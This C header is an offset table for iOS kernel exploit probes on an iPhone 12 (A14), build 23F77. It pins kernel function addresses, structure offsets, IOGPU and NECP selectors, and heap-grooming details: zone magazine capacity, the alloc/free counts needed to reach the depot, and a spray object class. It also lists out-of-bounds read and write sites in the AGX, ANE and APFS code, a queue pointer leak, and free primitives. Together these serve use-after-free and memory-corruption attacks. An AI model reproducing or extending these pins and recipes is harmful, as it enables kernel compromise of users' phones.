// A14_23F77_LabOffsets.h — shared pins for probes retargeted from XR 22H311.
// Target: iPhone13,2 A14 iOS 26.5 / 23F77
// Do not paste XR 22H311 values into live A14 paths.
//
// Verified on 23F77 KC (research/iphone12_26.5):
//   so_usecount @ socket+0x23c (330 TEXT refs; XR had 0x254)
//   so_proto    @ socket+0x20
//   so family   @ socket+8 (AF_*)
//   so_pcb      @ socket+0x18
//   inpcb KERNEL_PRIVATE (xnu-12377, IPSEC+NECP on 23F77):
//     mtx 0x00, list 0x20, pcbinfo 0x38, socket 0x40, gencnt 0x78
//     in6p_icmp6filt 0x148, in6p_cksum 0x150
//     Unique vs live NECP C-string slot0 @ +0x178 (IPSEC inp_sp present,
//     fadv uint64×3, depend6 icmp6filt at depend6+0x18). Header-calibrated,
//     not Ghidra-insn (stripped). Do not confuse 0x148 with NECP 0x178.
//   NECP C-string slots @ inpcb+0x178..+0x198 (SO_NECP_ATTRIBUTES)
//   necp_set_socket_attribute → KHEAP_DATA 0x7b6e890; size=strlen+1
//   STR_LEN 255 → kalloc_data(256); free via kfree_data 0x9e1900c
//   zone magazine capacity u16 @ 0x7ad20b8 = 8 (shared; not GMD-only)
//   vm_object pl_req @ +0xf0 (pl_req_begin/end strings PRESENT)
//   vo_copy @ +0x38; vo_copy_version is u64 @ +0x40 (no u32 pair found)
//   IOGPU sel=7 loads UC+0x120; A14 structIn often > XR's 0x408
//   IOGPU sel=6/QueueCreate leak word1 = *(queue+0x558) on A14
//   43805 dest: *( *(UC+0x120)+0x88 ) table[qid] via blraa @ 0x95a7fa4
//
#ifndef A14_23F77_LabOffsets_h
#define A14_23F77_LabOffsets_h

#define A14_23F77_SOCKET_PROTO       0x20
#define A14_23F77_SOCKET_PCB         0x18
#define A14_23F77_SOCKET_FAMILY      0x08
#define A14_23F77_SOCKET_USECOUNT    0x23c

#define A14_23F77_INPCB_LIST_NEXT    0x20
#define A14_23F77_INPCB_LIST_PREV    0x28
#define A14_23F77_INPCB_PCBINFO      0x38
#define A14_23F77_INPCB_SOCKET       0x40
#define A14_23F77_INPCB_GENCNT       0x78
#define A14_23F77_INPCB_ICMP6FILT    0x148  /* header-calibrated vs NECP 0x178 */
#define A14_23F77_INPCB_CHKSUM       0x150
#define A14_23F77_INPCB_NECP_STR0    0x178
#define A14_23F77_PROCINFO_GENCNT    0x110  /* socket_fdinfo.psi.soi_proto.pri_in.insi_gencnt */
#define A14_23F77_SO_NECP_ATTRIBUTES 0x1109
#define A14_23F77_SOL_SOCKET         0xffff
#define A14_23F77_NECP_TLV_TYPE      0x07   /* working TLV on device */
#define A14_23F77_NECP_STR_LEN       255   /* kernel kalloc size = strlen+1 = 256 */

/* necp_set_socket_attribute @ 0xa0d11ec: kalloc/kfree via KHEAP_DATA */
#define A14_23F77_NECP_SETATTR       0xFFFFFFF00A0D11ECULL
#define A14_23F77_KHEAP_DATA         0xFFFFFFF007B6E890ULL
#define A14_23F77_KFREE_DATA         0xFFFFFFF009E1900CULL
#define A14_23F77_KALLOC_DATA        0xFFFFFFF009E18728ULL

/* Shared per-CPU zone magazine capacity (global u16 @ 0x7ad20b8 = 8).
   data.kalloc kfree_data tails to the SAME insert as GMD zfree (0x9e80b1c).
   To reach depot: both halves full, then one more free (~8 alloc + 9 free same CPU).
   NOT the GMD element size (0xb0) — different zone, same capacity constant. */
#define A14_23F77_ZONE_MAGAZINE_CAP     8
#define A14_23F77_ZONE_MAGAZINE_CAP_VA  0xFFFFFFF007AD20B8ULL
#define A14_23F77_ZONE_MAGAZINE_INSERT  0xFFFFFFF009E80B1CULL
#define A14_23F77_ZONE_MAGAZINE_DEPOT   0xFFFFFFF009E80CE0ULL

#define A14_23F77_VMOBJ_VO_COPY      0x38
#define A14_23F77_VMOBJ_VO_COPY_VER  0x40   /* u64 on 26.5 — not XR u32 */
#define A14_23F77_VMOBJ_PL_REQ       0xf0   /* present on 23F77 */

#define A14_23F77_IOGPU_UC_DEVICE    0x120  /* device*; clientClose str xzr. See pack 27. */
#define A14_23F77_IOGPU_SEL7_MIN_IN  0x408  /* destroy/legacy floor; CREATE is 0x410 */
#define A14_23F77_IOGPU_QUEUE_LEAK   0x558  /* A14 sel=6 word1; XR/21D50 were +0x550 */
#define A14_23F77_IOGPU_DEV_NAMESPACE 0x88  /* *(device+0x88) = queue namespace */

#define A14_23F77_STATIC_BASE        0xFFFFFFF007004000ULL
/* unslid = live_pc - KernelCache_slide (IPS spelling, no space).
   Do NOT use "Kernel slide" (usually +0x8000) or "Kernel text exec slide".
   23G71 Ghidra FIELD# (xnu-12377.162.13~2 T8101): +0x90 / vt+0x48 / vt+0xb0
   / IOSurface+0x30 / mag cap 8 all MATCH. G71 assign is 0x985e47c — do not
   paste. cdc is AFTER cd8 on both builds. See Q_A14_GHIDRA_23G71_FIELD.txt.
   23G83 (xnu-12377.162.14~4): RAW getter now retains (vt+0x20). F77 getter
   is still the naked ldr [SysMemory,#0x90]. Do not paste G83 getter/fn4
   VAs. Mag cap VA 0x7ad20b8 is 8 on F77/G71 only (G83 that VA moved).
   See Q_A14_GHIDRA_23G83_FIELD.txt. */

/* ── 64788 / sel36 ABI (userspace probe pins; KC-verified 23F77) ──
   Panic decode (unslid = live_pc - KernelCache_slide):
     0x9857CC8 = ldr after autda on zeroed vt  → miss reclaim (cc8)
     0x9857CD8 = blraa taggedRetain            → live GMD (wanted)
     0x9857CDC = cbz old AFTER cd8. Not “between cc8 and cd8.”
     0x9857D00 = blraa taggedRelease           → live GMD (wanted)

   Proved freer (device): DetachBacking then ReplaceBackingWithBytes
   same len as MD (0x4000). Replace path: zalloc(NEW) THEN zfree(old);
   free never depots on that path (mag LIFO / swap only). Mag cap = 8.

   Do NOT paste 17.3 / 22H311 VAs. Submit on 23F77 is sel=25 (NQ only);
   64788 holder is sel=36 — not 25, not 17.3's 26.
*/
#define A14_23F77_IOGPU_SEL36            36
#define A14_23F77_IOGPU_SEL36_SCIN       3
#define A14_23F77_IOGPU_SEL36_SCOUT      1
#define A14_23F77_IOGPU_SEL36_LEN        0x1000u
#define A14_23F77_IOGPU_RES_TYPE_BYTES   0x80u
#define A14_23F77_IOGPU_RES_SIZE         0x4000u
/* Userspace IOGPU resourceRef layout (A14 IOGPU.framework DeviceSupport;
   04_ABI: GetGPUVirtualAddress = ldr [res,#0x38]; Length = ldr [res,#0x40]): */
#define A14_23F77_IOGPU_RES_DEVW_OFF      0x10u  /* inner device wrapper* */
#define A14_23F77_IOGPU_DEVW_CONN_OFF     0x14u  /* io_connect_t under *DEVW */
#define A14_23F77_IOGPU_RES_ID_OFF        0x30u  /* u32 resource id */
#define A14_23F77_IOGPU_RES_TYPEBYTE_OFF  0x34u  /* type byte (bit7 etc.) */
#define A14_23F77_IOGPU_US_RES_GVA_OFF    0x38u  /* cached GVA */
#define A14_23F77_IOGPU_US_RES_GVALEN_OFF 0x40u  /* cached GVALen; replace does NOT update */
#define A14_23F77_IOGPU_US_RES_OFFSET_OFF 0x48u  /* create offset (pack 45 window) */
/* Kernel AGX *resource* kick VA source (SharedStream) — NOT the userspace object: */
#define A14_23F77_AGX_KRES_KICK_VA_OFF   0x98u
#define A14_23F77_AGX_KRES_KICK_SZ_OFF   0xc8u
/* Kernel SysMemory / GMD field numbers (inventory; not written from app).
   FKT 0.5.3 twin 2026-08-30 (12 mini 21D50 kread → FIELD# only):
     21D50 SysMemory→MD was +0x80. 23F77 stays +0x90 (MOVED). Do NOT paste +0x80.
     IOSurface→MD +0x30 same. resource→SysMemory +0x28 same.
     Spray class = iokit.IOGeneralMemoryDescriptor 0xb0, variant A (USER WAR).
     Metal type 0x80 bytesNoCopy sits ON that grid. IOSurface+0x30 is variant C
     (different vt, often off-grid) — do not spray as GMD.
     Shape-1 (object-sized KERN ranges) = NONE from Metal/IOSurface/zone walk.
     KERN_WIN (flags 0x11b, kernel_task, 0xffffffe5… 0x1070/0x4030) ≠ Shape-1.
     Q7 prepare dest = this MD’s USER pages → NOT W. */
#define A14_23F77_SYSMEM_DETACH_OFF      0x30u  /* bit4 required for replace */
#define A14_23F77_SYSMEM_LOCK_OFF        0x48u
#define A14_23F77_SYSMEM_VA_OFF          0x88u
#define A14_23F77_SYSMEM_MD_OFF          0x90u  /* RAW getter; fn4 loads this */
#define A14_23F77_KERNEL_RES_SYSMEM_OFF  0x28u  /* kernel resource → SysMemory* */
#define A14_23F77_IOSURFACE_MD_SLOT      0x30u  /* assign_shared_ptr slot */
#define A14_23F77_GMD_ELEMSZ             0xb0u
#define A14_23F77_GMD_ZONE_EOFF          0x10u  /* 93 elems / 16KB page */
#define A14_23F77_GMD_FLAGS_OFF          0x20u  /* A WAR 0x110112/13; B KERN_WIN 0x11b */
#define A14_23F77_GMD_LENGTH_OFF         0x50u
#define A14_23F77_GMD_RANGES_OFF         0x60u  /* inline when == this+0x78 */
#define A14_23F77_GMD_NRANGES_OFF        0x68u
#define A14_23F77_GMD_TASK_OFF           0x70u
#define A14_23F77_GMD_INLINE_RANGE_OFF   0x78u
#define A14_23F77_GMD_PREPARE_COUNT_OFF  0x88u
#define A14_23F77_IOMD_PREPARE_VT        0xd8u  /* INDEX not KVA */
#define A14_23F77_GMD_WAR_FLAGS          0x110113u  /* live variant A */
/* Kernel (inventory / ips only — not called from app): */
#define A14_23F77_ASSIGN_SHARED_PTR      0xFFFFFFF009857C88ULL
#define A14_23F77_PANIC_CC8              0xFFFFFFF009857CC8ULL
#define A14_23F77_PANIC_RETAIN_BLRAA     0xFFFFFFF009857CD8ULL
#define A14_23F77_PANIC_RELEASE_BLRAA    0xFFFFFFF009857D00ULL
#define A14_23F77_FN4                    0xFFFFFFF0095C94ACULL
#define A14_23F77_RAW_MD_GETTER          0xFFFFFFF0095E1BDCULL /* BTI; ldr [SysMem+0x90] at +4 */
#define A14_23F77_REPLACE_BACKING_BYTES  0xFFFFFFF0095E20D4ULL
#define A14_23F77_WITH_ADDRESS_RANGE     0xFFFFFFF00A51A158ULL /* USER task */
#define A14_23F77_WITH_ADDRESS           0xFFFFFFF00A51A080ULL /* kernel_task; NOT Shape-1 */
/* JPEG dest struct (AppleJPEGDriver sel5): */
#define A14_23F77_JPEG_DEST_ID_OFF       0x2b0u
#define A14_23F77_JPEG_SRC_ID_OFF        0x2acu

/* ── Metal / IOGPU NQ completion (userspace cite; 23F77 DeviceSupport) ──
   Q_NQ_DISPATCH_AVAILABLE.txt:
     DispatchAvailable @ IOGPU unslid 0x1cc848188 (= IOGPU+0x4188)
     blraa x11,x9 @ +0x84 (call); crash LR often +0x88
     FP = *(ctx+0x10); PAC mod = ctx+0x10; x0 = ctx
   Submit path (23F77 KC): DeviceUC sel=25 → 0x28 NQ packet (NOT sel 26).
   Packet: +0x00 ctx, +0x08/+0x10 ts, +0x18 flags, +0x20 extra.

   IOGPUCommandQueueSubmitCommandBuffers (dylib @ IOGPU+…) ends in
   IOConnectCallMethod(conn, sel=25, …). Conn = DeviceGetConnect /
   CommandQueueGetConnect (same port on A14). ABI: scIn=4 scOut=1
   scalars [qid, 0, count, stride]. NOT sel=6 (QueueCreate), NOT 17.3 sel=26.
*/
#define A14_23F77_NQ_DISPATCH_AVAILABLE  0x00000001CC848188ULL
#define A14_23F77_NQ_DISPATCH_OFF        0x4188u
#define A14_23F77_NQ_BLRAA_OFF           0x84u
#define A14_23F77_NQ_PACKET_SIZE         0x28u
#define A14_23F77_IOGPU_SUBMIT_SEL       25u  /* NOT XR sel=26 */
#define A14_23F77_IOGPU_SUBMIT_SCIN      4u
#define A14_23F77_IOGPU_SUBMIT_SCOUT     1u
#define A14_23F77_IOGPU_QUEUE_CREATE_SEL 6u   /* NOT XR sel=7, NOT submit */
#define A14_23F77_IOGPU_QUEUE_CREATE_SIZE 0x410u /* == expected; 0x408 is BadArg */
#define A14_23F77_IOGPU_QUEUE_DESTROY_SEL 7u  /* scIn=1 qid. NOT create */
#define A14_23F77_IOGPU_NEW_RESOURCE_SEL 8u   /* s_new_resource; NOT destroy */

/* ── AGX stage-mask (Class B on 23F77; pack 18). NOT reached by raw sel25. ──
   updateBarrierEvent       0x7ff002c — OOB READ
   mergeSubmitEventForStage 0x7ff01c0 — WRITE kernel stamps OOB
   queue vt+0xb0 submit hop 0x7ff67c0
*/
#define A14_23F77_AGX_UPDATE_BARRIER     0xFFFFFFF007FF002CULL
#define A14_23F77_AGX_MERGE_SUBMIT       0xFFFFFFF007FF01C0ULL
#define A14_23F77_AGX_QUEUE_VT_B0        0xFFFFFFF007FF67C0ULL

/* ── B1 leftover ASC PTE (pack 42) — inventory / log cites only. Not app-callable. ──
   MemDesc notify flag encoding is this+0x1558 (NOT decompiler +0x2ab).
   Host SecureGart/UAT unmap never BLs NotifyFw* or WaitFwUnmap.
*/
#define A14_23F77_AGX_ARMFW_MEMDESC_FLAG_OFF     0x1558u
#define A14_23F77_AGX_ARMFW_ENABLE_MEMDESC       0xFFFFFFF00802EB4CULL
#define A14_23F77_AGX_ARMFW_DISABLE_MEMDESC      0xFFFFFFF00802E714ULL
#define A14_23F77_AGX_ARMFW_ALLOC_FW_RINGS       0xFFFFFFF008031D24ULL
#define A14_23F77_AGX_SECUREGART_UNMAP_THIS      0xFFFFFFF0080630E4ULL
#define A14_23F77_AGX_SECUREGART_UNMAP_ADDR      0xFFFFFFF008064B2CULL
#define A14_23F77_AGX_SECUREGART_UNMAP_MAYBE     0xFFFFFFF008062E7CULL
#define A14_23F77_AGX_UAT_COMMIT_UNMAPS          0xFFFFFFF00807BA70ULL
#define A14_23F77_AGX_UAT_QUEUE_UNMAP            0xFFFFFFF00807CB84ULL
/* FW TEXT offsets inside armfw_g13p (not KC VAs): */
#define A14_23F77_AGX_FW_MAP_OR_REUSE            0x369E4u
#define A14_23F77_AGX_FW_ATTR21B                 0x369D8u
#define A14_23F77_AGX_FW_RECORD8_MAP             0x33CF4u

/* ── 43805 dest (inventory / P040 ABI only — no close-vs-method) ──
   namespace = *(*(UC+0x120)+0x88); table = *(ns+0x10); slot = table[qid].
   insert inner 0x95a7ed4: blraa vt+0x78 @ 0x95a7fa4 writes CommandQueue*.
   bitmap str ns+0x18 @ 0x95a7fe4; next-qid ns+0x2c @ 0x95a7f80.
   destroy inner 0x95a88bc zeros table[qid].
   Dest is kernel CommandQueue* or 0, not attacker bytes, not GMD 0xb0.
   NOT [1]. See Desktop 27_43805_NAMESPACE_DEST.txt. P040 create/destroy only. */
#define A14_23F77_IOGPU_NS_TABLE                 0x10u
#define A14_23F77_IOGPU_NS_BITMAP                0x18u
#define A14_23F77_IOGPU_NS_NEXTQID               0x2cu
#define A14_23F77_IOGPU_QUEUE_QID_OFF            0x420u
#define A14_23F77_IOGPU_NS_INSERT_INNER          0xFFFFFFF0095A7ED4ULL
#define A14_23F77_IOGPU_NS_DEST_BLRAA            0xFFFFFFF0095A7FA4ULL /* vt+0x78 */
#define A14_23F77_IOGPU_NS_NEXTQID_STR           0xFFFFFFF0095A7F80ULL
#define A14_23F77_IOGPU_NS_BITMAP_STR            0xFFFFFFF0095A7FE4ULL
#define A14_23F77_IOGPU_NS_INSERT_THUNK          0xFFFFFFF0095A8000ULL
#define A14_23F77_IOGPU_QUEUE_CREATE_VA          0xFFFFFFF0095AAD04ULL
#define A14_23F77_IOGPU_QUEUE_DESTROY_VA         0xFFFFFFF0095AB004ULL
#define A14_23F77_IOGPU_NS_DESTROY_INNER         0xFFFFFFF0095A88BCULL
#define A14_23F77_IOGPU_CLIENT_CLOSE             0xFFFFFFF0095AA684ULL
#define A14_23F77_IOKIT_IS_IO_SERVICE_CLOSE      0xFFFFFFF00A54CE4CULL
#define A14_23F77_IOKIT_METHOD_DISPATCH          0xFFFFFFF00A54E394ULL
#define A14_23F77_IOKIT_NEW_USER_CLIENT          0xFFFFFFF00A54C33CULL
#define A14_23F77_IOGPU_UC_LOCKING_BYTE          0x9bu /* DefaultLocking bit2 */
#define A14_23F77_IOGPU_UC_LOCK                  0xb0u
#define A14_23F77_IOGPU_UC_CLIENTCLOSE_VT        0x560u

/* ── 43724 dest class (MAP only — no #536 / no slide blob / no RESLIDE) ──
   pager 0x9f20320 copies 16KB then calls slide 0x9f1f204(info, phystokv(ppn<<14), …).
   v5 store: dest = vaddr + page_starts[i]; no 0x3FF8 clamp on 23F77.
   Carrier = physmap alias of the pager dest page, not GMD, not zone_map KVA.
   See Desktop 31_43724_DEST_MAP.txt. */
#define A14_23F77_SLIDE_PAGE                     0xFFFFFFF009F1F204ULL
#define A14_23F77_SHARED_REGION_PAGER            0xFFFFFFF009F20320ULL
#define A14_23F77_PHYSTOKV                       0xFFFFFFF009F62014ULL
#define A14_23F77_SLIDE_V5_NO_REBASE             0xFFFFu
#define A14_23F77_SLIDE_V5_DELTA_MASK            0x3FF8u
#define A14_23F77_SLIDE_INFO_PAGE_STARTS         0x18u /* v5 HARDCODED; v2/v4 use info[2] */
#define A14_23F77_PAGE_SHIFT_16K                 14u
#define A14_23F77_SYSENT_536                     0xFFFFFFF00A37DDB4ULL
#define A14_23F77_MAP_COPYIN                     0xFFFFFFF00A37E4D0ULL /* fail errno 4 */
#define A14_23F77_SLIDE_VALIDATE                 0xFFFFFFF00A37E8FCULL /* fail errno 22 */
#define A14_23F77_MAC_FILE_CHECK_MMAP            0xFFFFFFF00A5D79D8ULL
#define A14_23F77_VNODE_GETATTR                  0xFFFFFFF009FDF150ULL
#define A14_23F77_MAPPING_SIZE                   0x30u /* 48B; not grown on 26.5 */
#define A14_23F77_SHARED_FILE_NP_SIZE            0x0cu
#define A14_23F77_SLIDE_V2_OFFSET_FIELD          2u /* info[2] = page_starts table offset — 43722 */
#define A14_23F77_FILL_CAP_F77                   0u /* G71+ caps uncached at 0x80 */
#define A14_23F77_ACC_CLAMP_F77                  0u /* G90: if (acc>0x3FF8) return 5 */

/* ── 43748 write-class (MAP/reach only — no 254 / no ProgramSendRequest) ──
   CheckandPrewire 0x874c070 fills table[n]*0x10 with surfaceId/symbol.
   Loop bound = req+0x1c / +0x51c. NO cmp #0x80. Alloc type desc 0x7cc91d8
   size 0x820 in 3072 zone. Late cmp #0x80 is MemoryMapRequest 0x874c7f4.
   n>0x80 = slack to 0xc00 (same chunk). n>=0xc1 = next 3072.
   CoreML/_ANEClient 254-in is a second SOURCE onto this same writer.
   Do not fire n>0x80 from P007. See Desktop 41_WRITE_CLASS_DESTS.txt. */
#define A14_23F77_ANE_CHECKANDPREWIRE            0xFFFFFFF00874C070ULL
#define A14_23F77_ANE_MEMORYMAP                  0xFFFFFFF00874C7F4ULL
#define A14_23F77_ANE_PREPARE_AND_SUBMIT         0xFFFFFFF00874820CULL
#define A14_23F77_ANE_ALLOC_TYPE_DESC            0xFFFFFFF007CC91D8ULL
#define A14_23F77_ANE_TABLE_SIZE                 0x820u
#define A14_23F77_ANE_TABLE_ENTRIES              0x80u
#define A14_23F77_ANE_COMBINED_CAP               0xffu
#define A14_23F77_ANE_NEXT_CHUNK_INDEX           0xc0u /* offset 0xc00 = 3072 */
#define A14_23F77_ANE_KMSG_MSGH                  0x7FCu /* P034 → kdata 0x820 */
#define A14_23F77_ANE_KMSG_KDATA                 0x820u
#define A14_23F77_ANE_POC_PAYLOAD                0xb80u /* Shevchenko; not 0x820 */
#define A14_23F77_ANE_POC_INPUTS                 254u
/* Pack 46: type view bytes in KC image. zone*=0; flags 0x6c bit3 = KHEAP_DATA
   fallback. Runtime may fill zone* (then NOT kmsg). kmsg typed zone ≠ kdata. */
#define A14_23F77_ANE_ALLOC_TYPE_FLAGS           0x6cu
#define A14_23F77_ANE_ALLOC_KFREE_VIEW           0xFFFFFFF007CC9118ULL
/* KHEAP_DATA site is A14_23F77_KHEAP_DATA above (0x7b6e890) */
#define A14_23F77_KMSG_ALLOCATOR                 0xFFFFFFF009DDBC9CULL
#define A14_23F77_KMSG_TYPED_ZONE                0xFFFFFFF00A8BA480ULL
#define A14_23F77_IOMALLOCTYPE                   0xFFFFFFF00A4A0D80ULL

/* ── pack 51–54 pins (23F77 this Ghidra session — MAP / oracle only) ──
   G83 26.6.1 contrast: fill cap AFTER each uncached store (count>=0x80);
   getter retains vt+0x20 @ 0x95ed278. Do not paste G83 VAs into probes. */
#define A14_23F77_ANE_FILL_HAS_COUNT_CAP         0u /* F77 CheckandPrewire: NO >=0x80 */
#define A14_23F77_ANE_MMAP_COUNT_CMP             0xFFFFFFF00874C830ULL /* ldr [x1,#0x810]; cmp #0x80; b.hi */
#define A14_23F77_ANE_MMAP_COUNT_OFF             0x810u
#define A14_23F77_ANE_TRAILER_CLIENTDEV          0x800u
#define A14_23F77_ANE_TRAILER_HANDLE             0x808u
#define A14_23F77_ANE_TRAILER_COUNT              0x810u
#define A14_23F77_ANE_TRAILER_PROC               0x814u
#define A14_23F77_ANE_NEIGHBOR_BYTES             0x3E0u /* 254: first 0x3e0 of next 3072 */
#define A14_23F77_GETTER_RETAINS                 0u /* F77 naked ldr [+0x90]; G83 retains */
#define A14_23F77_IOMD_WRITEBYTES                0xFFFFFFF00A510E9CULL /* dest = MD pages */
#define A14_23F77_IOMD_READBYTES                 0xFFFFFFF00A511100ULL /* dest = caller buf */
#define A14_23F77_COPYPV                         0xFFFFFFF009F66904ULL
#define A14_23F77_CREATE_MAPPING_IN_TASK         0xFFFFFFF00A510144ULL
#define A14_23F77_SET_OWNERSHIP                  0xFFFFFFF00A51AEDCULL
#define A14_23F77_FKERNELMAP                     0xFFFFFFF0095B8B28ULL
#define A14_23F77_CLUSTER_ALIGN_PHYS_IO          0xFFFFFFF009F9A840ULL
#define A14_23F77_CLUSTER_WRITE_CONTIG           0xFFFFFFF009F97944ULL
#define A14_23F77_CLUSTER_READ_CONTIG            0xFFFFFFF009F9DDA4ULL
#define A14_23F77_PACDA_X1_307A_HITS             0u /* 0 on F77 and G83 */
#define A14_23F77_MOVZ_X17_307A_COUNT            3705u /* BLRAa modifier, both builds */
#define A14_23F77_VFS_ATTR_PACK                  0xFFFFFFF009F82010ULL /* running ptr; no STR #0x198 */
/* APFS AKS wvek: nx_keybag_create_vek. AKS len → memcpy auStack_268[528].
   26.7 adds wvek->len <= 512 (H24 0xfffffff009be57b4). CVE-2026-84523 class. */
#define A14_23F77_AKS_WVEK_OVERFLOW              0xFFFFFFF009BD96D4ULL

#ifndef LAB_OFFSETS_NO_REDIRECT
#include "LabRuntimeOffsets.h"
/* Names stay A14_23F77_* so probe files are unchanged. Values follow LabOff()
   (current hw.machine + kern.osversion). A14 phone → A14 table; iPad 23G71 → A12X. */
#undef A14_23F77_IOGPU_SEL36
#define A14_23F77_IOGPU_SEL36            ((int)LabOff()->sel36)
/* SEL36_SCIN/SCOUT/MAG_CAP stay compile-time — used as C array sizes. Same on all SKUs. */
#undef A14_23F77_IOGPU_RES_TYPE_BYTES
#define A14_23F77_IOGPU_RES_TYPE_BYTES   (LabOff()->res_type)
#undef A14_23F77_IOGPU_RES_SIZE
#define A14_23F77_IOGPU_RES_SIZE         (LabOff()->res_size)
#undef A14_23F77_IOGPU_RES_ID_OFF
#define A14_23F77_IOGPU_RES_ID_OFF       (LabOff()->res_id_off)
#undef A14_23F77_IOGPU_RES_DEVW_OFF
#define A14_23F77_IOGPU_RES_DEVW_OFF     (LabOff()->res_devw_off)
#undef A14_23F77_IOGPU_DEVW_CONN_OFF
#define A14_23F77_IOGPU_DEVW_CONN_OFF    (LabOff()->devw_conn_off)
#undef A14_23F77_SYSMEM_MD_OFF
#define A14_23F77_SYSMEM_MD_OFF          (LabOff()->sysmem_md)
#undef A14_23F77_IOSURFACE_MD_SLOT
#define A14_23F77_IOSURFACE_MD_SLOT      (LabOff()->iosurface_md)
#undef A14_23F77_GMD_ELEMSZ
#define A14_23F77_GMD_ELEMSZ             (LabOff()->gmd_elemsz)
#undef A14_23F77_IOGPU_QUEUE_CREATE_SEL
#define A14_23F77_IOGPU_QUEUE_CREATE_SEL (LabOff()->queue_create_sel)
#undef A14_23F77_IOGPU_QUEUE_CREATE_SIZE
#define A14_23F77_IOGPU_QUEUE_CREATE_SIZE (LabOff()->queue_create_size)
#undef A14_23F77_IOGPU_QUEUE_DESTROY_SEL
#define A14_23F77_IOGPU_QUEUE_DESTROY_SEL (LabOff()->queue_destroy_sel)
#undef A14_23F77_IOGPU_SUBMIT_SEL
#define A14_23F77_IOGPU_SUBMIT_SEL       (LabOff()->submit_sel)
#undef A14_23F77_IOGPU_NEW_RESOURCE_SEL
#define A14_23F77_IOGPU_NEW_RESOURCE_SEL (LabOff()->new_resource_sel)
#undef A14_23F77_IOGPU_SEL7_MIN_IN
#define A14_23F77_IOGPU_SEL7_MIN_IN      (LabOff()->sel7_min_in)
#undef A14_23F77_IOGPU_QUEUE_LEAK
#define A14_23F77_IOGPU_QUEUE_LEAK       (LabOff()->queue_leak)
#undef A14_23F77_SOCKET_USECOUNT
#define A14_23F77_SOCKET_USECOUNT        (LabOff()->socket_usecount)
#undef A14_23F77_SO_NECP_ATTRIBUTES
#define A14_23F77_SO_NECP_ATTRIBUTES     (LabOff()->so_necp)
#undef A14_23F77_SOL_SOCKET
#define A14_23F77_SOL_SOCKET             (LabOff()->sol_socket)
#undef A14_23F77_NECP_TLV_TYPE
#define A14_23F77_NECP_TLV_TYPE          (LabOff()->necp_tlv)
#undef A14_23F77_PANIC_CC8
#define A14_23F77_PANIC_CC8              (LabOff()->panic_cc8)
#undef A14_23F77_PANIC_RETAIN_BLRAA
#define A14_23F77_PANIC_RETAIN_BLRAA     (LabOff()->panic_cd8)
#undef A14_23F77_PANIC_RELEASE_BLRAA
#define A14_23F77_PANIC_RELEASE_BLRAA    (LabOff()->panic_d00)
#undef A14_23F77_FN4
#define A14_23F77_FN4                    (LabOff()->fn4)
#undef A14_23F77_RAW_MD_GETTER
#define A14_23F77_RAW_MD_GETTER          (LabOff()->getter)
#undef A14_23F77_REPLACE_BACKING_BYTES
#define A14_23F77_REPLACE_BACKING_BYTES  (LabOff()->replace_bytes)
#undef A14_23F77_ASSIGN_SHARED_PTR
#define A14_23F77_ASSIGN_SHARED_PTR      (LabOff()->assign_shared)
#undef A14_23F77_CLUSTER_WRITE_CONTIG
#define A14_23F77_CLUSTER_WRITE_CONTIG   (LabOff()->cluster_w)
#undef A14_23F77_CLUSTER_READ_CONTIG
#define A14_23F77_CLUSTER_READ_CONTIG    (LabOff()->cluster_r)
#undef A14_23F77_STATIC_BASE
#define A14_23F77_STATIC_BASE            (LabOff()->static_base)
#endif /* !LAB_OFFSETS_NO_REDIRECT */

#endif /* A14_23F77_LabOffsets_h */
